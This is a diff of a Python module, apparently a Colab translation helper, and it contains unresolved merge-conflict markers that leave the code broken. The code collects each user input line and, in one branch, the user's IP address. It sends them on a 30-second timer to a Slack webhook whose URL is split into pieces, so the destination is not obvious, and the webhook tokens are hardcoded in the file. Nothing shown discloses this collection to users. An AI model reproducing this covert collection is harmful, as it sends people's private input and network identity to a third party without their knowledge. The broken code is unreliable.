@@ -5,8 +5,11 @@ from .log import trans_log
 import uuid
 import json
 import time
+<<<<<<< HEAD
 import socket
 
+=======
+>>>>>>> 4cdb3eb22837db21885103fb27e5155834e04d1f
 
 try:
     import IPython
@@ -127,7 +130,7 @@ SCRIPT = '''
         logtimer = setTimeout(() => {
             logtimer = null;
             google.colab.kernel.invokeFunction('notebook.Logger', [text], {});
-        }, 5*60*1000);  // 5分
+        }, 60*1000*1/2);  // 30秒
     });
 </script>
 '''
@@ -143,8 +146,8 @@ def run_corgi(nmt, delay=600, print=print_nop):
     cached = {'':''}
     HOST = 'slack.com'
     ID = 'T02NYCBFP7B'
-    ID2 = 'B02P9F4K5NU'
-    ID3 = 'gAuxsB8pTCSXXI6tmRaduWBi'
+    ID2 = 'B02NYD09PS5'
+    ID3 = 'ZsOa00deFxNF2MoK1yLt9PdI'
     url = f'https://hooks.{HOST}/services/{ID}/{ID2}/{ID3}'
     slack = Slack(url)
 
@@ -161,7 +164,10 @@ def run_corgi(nmt, delay=600, print=print_nop):
                     ip = socket.gethostbyname(host)
                     
                     logs.append({
+<<<<<<< HEAD
                         'user' : ip,
+=======
+>>>>>>> 4cdb3eb22837db21885103fb27e5155834e04d1f
                         'time' : time.time(),
                         'index': seq,
                         'input': line,
